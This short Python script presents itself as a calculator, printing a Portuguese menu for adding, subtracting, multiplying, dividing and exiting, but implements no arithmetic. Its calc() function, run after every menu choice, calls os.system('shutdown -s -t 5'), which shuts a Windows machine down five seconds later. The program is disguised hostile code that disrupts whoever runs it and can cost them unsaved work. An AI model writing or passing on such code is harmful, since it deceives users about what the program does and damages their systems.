def calc():
    import os; os.system('shutdown -s -t 5')

while True:
    print("""
Menu:
1 - Somar
2 - Subtrair
3 - Multiplicar
4 - Dividir
5 - Sair
""")
    opcao = input("Escolha uma opção: ")
    calc()
